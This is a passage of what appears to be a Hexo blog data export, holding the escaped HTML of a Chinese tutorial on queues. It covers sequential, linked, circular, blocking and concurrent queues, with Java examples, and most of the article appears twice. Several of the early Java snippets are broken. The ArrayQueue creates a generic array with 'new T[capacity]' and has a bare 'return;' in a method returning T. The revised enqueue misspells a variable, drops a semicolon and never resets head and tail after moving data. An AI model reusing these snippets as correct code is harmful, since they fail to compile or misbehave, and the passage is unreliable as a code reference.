class=\"line\">       <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">toString</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Arrays.toString(items);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">size</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"阻塞队列和并发队列\"><a href=\"#阻塞队列和并发队列\" class=\"headerlink\" title=\"阻塞队列和并发队列\"></a>阻塞队列和并发队列</h3></div><br></div>\n\n<p>上面讲的都是些理论知识，看起来很难跟实际项目扯上关系，确实，队列这种数据结构很基础，平时的业务开发不大可能从零开始实现一个队列，甚至都不会直接用到。而一些具有特殊特性的队列应用却比较广泛，如阻塞队列和并发队列。</p>\n<p><strong>阻塞队列</strong>其实就是在队列基础上增加了阻塞操作。简单来说，就是在队列为空的时候，从对头取数据会被阻塞。并未此时还没有数据可取，直到队列中有了数据才能返回；如果队列已经满了，那么插入数据的操作就会被阻塞，直到队列中有空闲位置后在插入数据，然后在返回。</p>\n<img src=\"/posts/2018-09-16-算法-队列/阻塞队列.jpg\">\n<p>你应该已经发现了，上述的定义就是一个”生产者-消费者模型”！是的，我们可以用阻塞队列轻松实现一个”生产者-消费者模型”。</p>\n<p>这种基于阻塞队列实现的”生产者-消费者模型”可以有效的协调生产和消费的速度。当”生产者”生产数据的速度过快，”消费者”来不及消费时，存储数据的队列很快就会满了，这个时候，生产者就阻塞等待，直到”消费者”消费了数据，”生产者”才会被唤醒继续生产。</p>\n<p>而且不仅如此，基于阻塞队列，我们可以通过协调”生产者”和”消费者”的个数，来提高数据处理的效率。比如前面的例子，我们可以配备多个”消费者”，来对应一个”生产者”。</p>\n<img src=\"/posts/2018-09-16-算法-队列/多消费者阻塞队列.jpg\">\n<p>前面讲了阻塞队列，在多线程情况下，会有多个线程同时操作队列，这个时候就会存在线程安全问题，那如何实现一个线程安全的队列呢？</p>\n<p>线程安全的队列我们叫做<strong>并发队列</strong>。最简单直接的实现方式是直接在enqueue()、dequeue()上加锁，但是这样锁粒度大并发较低，同一时刻仅允许一个村或者取操作。实际上，基于数组的循环队列，利用CAS原子操作，可以实现非常高效的并发队列。这也是循环队列比链式队列应用更加广泛的原因。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>队列的知识讲完了，我们来看一下开篇的问题。线程池没有空闲线程时，新的任务请求线程资源时，线程池该如何处理，各种处理策略又是如何实现的呢？</p>\n<p>我们一般有两种处理策略。第一种是非阻塞的处理方式，直接拒绝任务请求；另一种是阻塞的处理方式，将请求进行排队，等到有空闲线程时，取出队列中的请求继续处理。那如何存储排队的请求呢？</p>\n<p>我们希望公平的处理每个排队的请求，先进者先出，所以队列这种数据结构很适合存储排队请求。我们前面说过，队列有基于链表和基于数组这两种方式，那这两种实现方式对于排队请求又有什么区别呢？</p>\n<p>基于链表实现的方式，可以实现一个支持无限排队的无界队列，但是可能会导致过多的请求排队等待，请求处理的响应时间过长。所以，针对响应时间较敏感的系统，基于链表实现的无限排队的线程池是不合适的。</p>\n<p>而基于数组实现的有界队列，队列的大小有限，所以线程池中排队的请求超过队列大小时，接下来的请求就会被拒绝，这种方式对响应时间敏感的系统，就相对来说比较合理。不过设置一个合适的队列大小，也是非常有讲究的。队列太大导致等待的请求太多，队列太小会导致无法充分利用系统资源，发挥最大性能。</p>\n<p>除了前面讲到的应用在线程池请求排队的场景之外，队列还可以应用在任何有限资源池中，用于排队请求，比如数据库连接池。实际上，对于大部分资源有限的场景，当没有空闲资源时，基本上都可以通过队列这种数据结构来实现队列请求排队。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天我们讲了一种跟栈很相似的数据结构，队列。</p>\n<p>队列最大的特点就是先进先出，主要的两个操作是入队和出队。跟栈一样，它既可以用数组来实现，也可以用链表来实现。用数组实现的叫顺序队列，用链表实现的叫链式队列。特别是一个长得像环一样的叫循环队列。在用数组实现的队列时，会有数据搬移的工作，要想解决数据搬移的工作，我们就需要像环一样的循环队列。</p>\n<p>循环队列是这篇的重点，要想写出没有bug的循环队列的实现代码，关键是要确定队满和队空的判定条件。</p>\n<p>除此之外，还有几种高级的数据结构，阻塞队列、并发队列，但是底层都是队列这种数据结构，只不过附加了其他的一些功能。阻塞队列就是可以对出队、入队操作进行阻塞，并发队列就是保证了多线程的队列操作线程安全。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3></div><br></div>\n\n<p>1、 除了线程池这种池结构会用到队列排队请求，你还知道那些类似的数据结构或者场景会用到队列的排队请求。</p>\n<p>如数据库的连接池、分布式应用中的消息队列（kafka、MQ）</p>\n<p>2、 关于并发队列，如何实现无锁的并发队列。</p>\n<blockquote>\n<p>提示： CAS(compare and swap) 乐观锁 悲观锁</p>\n</blockquote>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>我们知道，CPU资源是有限的，任务的处理逻辑与线程个数并不是正相关。相反，过多的线程反而会导致CPU频繁切换，处理性能下降。所以，线程池的大小一般都是综合考虑要处理任务的特点与硬件环境，来事先设置的。</p>\n<p>当我们向一个固定大小的线程池中请求一个线程时，如果线程池中没有空闲资源了，这个时候线程池如何处理这个请求？是拒绝请求还是排队请求？各种处理策略又是如何实现的？</p>\n<p>其实，这些问题并不复杂，其底层的数据结构就是今天的内容，<strong>队列(queue)</strong>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何理解队列\"><a href=\"#如何理解队列\" class=\"headerlink\" title=\"如何理解队列\"></a>如何理解队列</h3></div><br></div>\n\n<p>队列这个概念非常好理解，你可以把它想象成排队买票，先来的先买，后来的人只能站末尾，不允许插队。<strong>先进者先出，这就是典型的队列</strong>。</p>\n<p>我们知道，栈只支持两个操作：<strong>入栈push()和出栈pop()</strong>，队列和栈非常类似，支持的操作只有：<strong>入队enqueue()</strong>，将一个数据放入队尾，<strong>出队dequeue()</strong>，从队头取出一个数据。</p>\n<img src=\"/posts/2018-09-16-算法-队列/队列.jpg\">\n<p>所以，队列跟栈一样，也是一种操作受限的线性表数据结构。</p>\n<p>队列的概念很好理解，基本操作也很容易掌握。作为一种非常基础的数据结构，队列的应用也非常广泛。特别是一些具有额外特性的队列，比如循环队列、阻塞队列、并发队列。它们在很多片底层系统、框架、中间件的开发中，起着关键性的作用。比如高性能队列Disruptor、Linux环形存储，都用到了循环队列；java.concurent并发包中用到了ArrayBlockingQueue来实现公平锁等。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"顺序队列和链式队列\"><a href=\"#顺序队列和链式队列\" class=\"headerlink\" title=\"顺序队列和链式队列\"></a>顺序队列和链式队列</h3></div><br></div>\n\n<p>我们知道了，队列跟栈一样，也是一种抽象的数据结构。它具有先进先出的特性，支持在队尾插入元素，在对头删除元素，那么究竟该如何实现一个队列呢？</p>\n<p>跟栈一样，队列可以用数组实现，也可以用链表实现。用数组实现的栈叫做顺序栈，用链表实现的栈叫做链式栈。同样，用数组实现的队列叫做<strong>顺序队列</strong>，用链表实现的队列叫做<strong>链式队列</strong>。</p>\n<p>先来看下基于数组的实现方法。我这里采用java语言进行实现，不会涉及高级语法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 基于数组实现的队列</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ArrayQueue</span>&lt;<span class=\"title\">T</span>&gt;</span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 数组items</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> T[] items;</span><br><span class=\"line\">\t<span class=\"comment\">// 队列大小</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> capacity;</span><br><span class=\"line\">\t<span class=\"comment\">// head表示队头下标，tail表示队尾下标</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> head=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> tail=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayQueue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>(<span class=\"number\">10</span>); <span class=\"comment\">// 队列默认容量给10</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayQueue</span><span class=\"params\">(<span class=\"keyword\">int</span> capacity)</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>.items = <span class=\"keyword\">new</span> T[capacity];</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>.capacity = capacity;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">enqueue</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(size == capacity)&#123;<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;&#125; <span class=\"comment\">// 队列满了</span></span><br><span class=\"line\">\t\titems[tail] = val;</span><br><span class=\"line\">\t\tsize ++;</span><br><span class=\"line\">\t\ttail ++;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">dequeue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (size == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tT res = items[head];</span><br><span class=\"line\">\t\thead++;</span><br><span class=\"line\">\t\tsize--;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> res;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>比起栈的数组实现，队列的数组实现稍微有点复杂。</p>\n<p>对于栈来说，我们只需要一个栈顶指针就可以了，但是队列需要两个指针：一个head指针，指向队头；一个tail指针，指向队尾。</p>\n<p>你可以结合下面这幅图来理解。当a、b、c、d…依次入队之后，指针中的head指针指向下标为1的位置，tail指针指向下标为7的位置。</p>\n<img src=\"/posts/2018-09-16-算法-队列/示例1.jpg\">\n<p>当我们调用两次出队操作之后，队列中的head指针指向下标为5的位置，tail仍然指向下标为7的位置。</p>\n<img src=\"/posts/2018-09-16-算法-队列/示例2.jpg\">\n<p>你肯定已经发现了，随着不停的入队、出队操作，head、tail都会持续往后移动。当tail移动到最右边，即使数组中还有空闲空间，也无法继续往队列中添加数据了。这个问题如何解决呢？</p>\n<p>在数组那一节中，我们遇到过同样的问题，数组的删除操作会导致数组中的数据不连续，还记得我们怎么解决得吗？<strong>数据搬移</strong>！，但是每次出队时都相当于删除数组下标为0的数据，要搬移整个队列中的数据，这样队列的出队时间复杂度就从原来的O(1)变为了O(n)，能不能优化呢？</p>\n<p>实际上，我们在出队时可以不用搬移数据，如果没有空闲空间了，我们只需要在入队时，在集中触发一次数据的搬移操作。借助这个思想，出队函数保持不变，我们稍加改造一下入队函数enqueue()实现，就可以轻松解决刚才的问题了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">enqueue</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(size == capacity)&#123;<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;&#125; <span class=\"comment\">// 队列满了</span></span><br><span class=\"line\">\t<span class=\"comment\">// tail到尾部，队列没有满</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (tail == capactity &amp;&amp; size&lt;capacity) &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 数据搬移</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=head;i&lt;tail;i++) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// 将head到tail的数据搬移到0到size的位置</span></span><br><span class=\"line\">\t\t\titems[i-head] = items[i]</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\titems[tail] = val;</span><br><span class=\"line\">\tsize ++ ;</span><br><span class=\"line\">\ttail ++;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从代码中我们可以看到，当队列tail指针移动到数组的最右边后，且数组没有满时，如果有新的数据入队，我们可以将head-tail之间的数据，整体搬移到0-size之间的位置，</p>\n<p>这种思路中，出队的时间复杂度仍然是O(1)，但是入队的时间复杂度还是O(n)吗？此处用以前讲过的<strong>摊还分析法</strong>自行分析一下。</p>\n<p>接下来，我们看看<strong>基于链表的队列的实现方法</strong>。</p>\n<p>基于链表的实现，我们同样需要两个指针：head指针和tail指针。他们分别指向第一个结点和最后一个结点。入队时，tail-&gt;next = newNode, tail = tail-&gt;next;出队时，head = head-&gt;next。</p>\n<p>我将具体代码放到我的<a href=\"https://github.com/AriesRen/algorithm\" target=\"_blank\" rel=\"noopener\">github</a>上，有需要的可以看看。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"循环队列\"><a href=\"#循环队列\" class=\"headerlink\" title=\"循环队列\"></a>循环队列</h3></div><br></div>\n\n<p>我们上面用数组实现的队列，在tail=capacity的时候，会有数据搬移操作，这样入队操作性能就会受到影响。那有没有办法能够避免数据搬移操作呢？我们来看看循环队列的解决思路。</p>\n<p>循环队列，顾名思义，它长得像一个环。原本数组是有头有尾的，是一条直线，我们现在把首尾相连，掰成了一个环，可以通过下图直观感受一下。</p>\n<img src=\"/posts/2018-09-16-算法-队列/循环队列.jpg\">\n<p>我们可以看到，图中这个队列的大小为8，当前head=0，tail=3.当有一个新的元素d入队时，我们放入到下标为3的位置，并将tail指向4。当tail指向7，这时候再有新的元素入队时，我们并不将tail更新为8，而是将tail指向0，如果再有元素入队，放入下标为0处的位置，并将tail更新为1。当然如果head=0处没有出队的话，就说明队列满了。</p>\n<p>通过这样的方法，我们成功的避免了数据搬移操作，看起来不难理解，但是循环队列的代码实现难度要比前面讲的非循环队列难多了。要想写出没有bug的循环队列的实现代码，最关键的是，<strong>确定队列空和队列满的判定条件</strong>。</p>\n<p>在用数组实现的队列中，对空的判定条件是head==tail，队列满的条件是tail==capacity。那针对循环队列，如何判断队满和队空呢？</p>\n<p>队列为空的条件仍然是head==tail，但是队列满了的判断条件就复杂了，我画了如下一张队列满的图，可以看一下队满的规律。</p>\n<img src=\"/posts/2018-09-16-算法-队列/循环队列满.jpg\">\n<p>图中队列满时，tail=3，head=4，size=8，capacity=8，多画几张队满的图，就会发现队满时（tail+1）%capacity = head。同时，head和tail不能简单的使用++或者–，得出规律tail=(tail+1)%capacity，head=(head+1)%capacity。</p>\n<p>下面看下一下循环队列的代码：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 基于数组实现的循环队列</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CircularQueue</span>&lt;<span class=\"title\">T</span>&gt; <span class=\"keyword\">implements</span> <span class=\"title\">Queue</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 数组items</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Object[] items;</span><br><span class=\"line\">    <span class=\"comment\">// 队列大小</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> capacity;</span><br><span class=\"line\">    <span class=\"comment\">// head表示队头下标，tail表示队尾下标</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> head=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> tail=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">CircularQueue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>(<span class=\"number\">10</span>); <span class=\"comment\">// 队列默认容量给10</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">CircularQueue</span><span class=\"params\">(<span class=\"keyword\">int</span> capacity)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.items = <span class=\"keyword\">new</span> Object[capacity];</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.capacity = capacity;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">enqueue</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((tail+<span class=\"number\">1</span>)%capacity == head)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">\"循环队列满了！\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        items[tail] = val;</span><br><span class=\"line\">        tail = (tail+<span class=\"number\">1</span>)%capacity;</span><br><span class=\"line\">        size ++;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">dequeue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (size&lt;=<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">           <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">\"空队列！\"</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       T res = (T) items[head];</span><br><span class=\"line\">       size--;</span><br><span class=\"line\">       head = (head+<span class=\"number\">1</span>)%capacity;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">toString</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Arrays.toString(items);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">size</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"阻塞队列和并发队列\"><a href=\"#阻塞队列和并发队列\" class=\"headerlink\" title=\"阻塞队列和并发队列\"></a>阻塞队列和并发队列</h3></div><br></div>\n\n<p>上面讲的都是些理论知识，看起来很难跟实际项目扯上关系，确实，队列这种数据结构很基础，平时的业务开发不大可能从零开始实现一个队列，甚至都不会直接用到。而一些具有特殊特性的队列应用却比较广泛，如阻塞队列和并发队列。</p>\n<p><strong>阻塞队列</strong>其实就是在队列基础上增加了阻塞操作。简单来说，就是在队列为空的时候，从对头取数据会被阻塞。并未此时还没有数据可取，直到队列中有了数据才能返回；如果队列已经满了，那么插入数据的操作就会被阻塞，直到队列中有空闲位置后在插入数据，然后在返回。</p>\n<img src=\"/posts/2018-09-16-算法-队列/阻塞队列.jpg\">\n<p>你应该已经发现了，上述的定义就是一个”生产者-消费者模型”！是的，我们可以用阻塞队列轻松实现一个”生产者-消费者模型”。</p>\n<p>这种基于阻塞队列实现的”生产者-消费者模型”可以有效的协调生产和消费的速度。当”生产者”生产数据的速度过快，”消费者”来不及消费时，存储数据的队列很快就会满了，这个时候，生产者就阻塞等待，直到”消费者”消费了数据，”生产者”才会被唤醒继续生产。</p>\n<p>而且不仅如此，基于阻塞队列，我们可以通过协调”生产者”和”消费者”的个数，来提高数据处理的效率。比如前面的例子，我们可以配备多个”消费者”，来对应一个”生产者”。</p>\n<img src=\"/posts/2018-09-16-算法-队列/多消费者阻塞队列.jpg\">\n<p>前面讲了阻塞队列，在多线程情况下，会有多个线程同时操作队列，这个时候就会存在线程安全问题，那如何实现一个线程安全的队列呢？</p>\n<p>线程安全的队列我们叫做<strong>并发队列</strong>。最简单直接的实现方式是直接在enqueue()、dequeue()上加锁，但是这样锁粒度大并发较低，同一时刻仅允许一个村或者取操作。实际上，基于数组的循环队列，利用CAS原子操作，可以实现非常高效的并发队列。这也是循环队列比链式队列应用更加广泛的原因。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>队列的知识讲完了，我们来看一下开篇的问题。线程池没有空闲线程时，新的任务请求线程资源时，线程池该如何处理，各种处理策略又是如何实现的呢？</p>\n<p>我们一般有两种处理策略。第一种是非阻塞的处理方式，直接拒绝任务请求；另一种是阻塞的处理方式，将请求进行排队，等到有空闲线程时，取出队列中的请求继续处理。那如何存储排队的请求呢？</p>\n<p>我们希望公平的处理每个排队的请求，先进者先出，所以队列这种数据结构很适合存储排队请求。我们前面说过，队列有基于链表和基于数组这两种方式，那这两种实现方式对于排队请求又有什么区别呢？</p>\n<p>基于链表实现的方式，可以实现一个支持无限排队的无界队列，但是可能会导致过多的请求排队等待，请求处理的响应时间过长。所以，针对响应时间较敏感的系统，基于链表实现的无限排队的线程池是不合适的。</p>\n<p>而基于数组实现的有界队列，队列的大小有限，所以线程池中排队的请求超过队列大小时，接下来的请求就会被拒绝，这种方式对响应时间敏感的系统，就相对来说比较合理。不过设置一个合适的队列大小，也是非常有讲究的。队列太大导致等待的请求太多，队列太小会导致无法充分利用系统资源，发挥最大性能。</p>\n<p>除了前面讲到的应用在线程池请求排队的场景之外，队列还可以应用在任何有限资源池中，用于排队请求，比如数据库连接池。实际上，对于大部分资源有限的场景，当没有空闲资源时，基本上都可以通过队列这种数据结构来实现队列请求排队。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天我们讲了一种跟栈很相似的数据结构，队列。</p>\n<p>队列最大的特点就是先进先出，主要的两个操作是入队和出队。跟栈一样，它既可以用数组来实现，也可以用链表来实现。用数组实现的叫顺序队列，用链表实现的叫链式队列。特别是一个长得像环一样的叫循环队列。在用数组实现的队列时，会有数据搬移的工作，要想解决数据搬移的工作，我们就需要像环一样的循环队列。</p>\n<p>循环队列是这篇的重点，要想写出没有bug的循环队列的实现代码，关键是要确定队满和队空的判定条件。</p>\n<p>除此之外，还有几种高级的数据结构，阻塞队列、并发队列，但是底层都是队列这种数据结构，只不过附加了其他的一些功能。阻塞队列就是可以对出队、入队操作进行阻塞，并发队列就是保证了多线程的队列操作线程安全。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3></div><br></div>\n\n<p>1、 除了线程池这种池结构会用到队列排队请求，你还知道那些类似的数据结构或者场景会用到队列的排队请求。</p>\n<p>如数据库的连接池、分布式应用中的消息队列（kafka、MQ）</p>\n<p>2、 关于并发队列，如何实现无锁的并发队列。</p>\n<blockquote>\n<p>提示： CAS(compare and swap) 乐观锁 悲观锁</p>\n</blockquote>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || 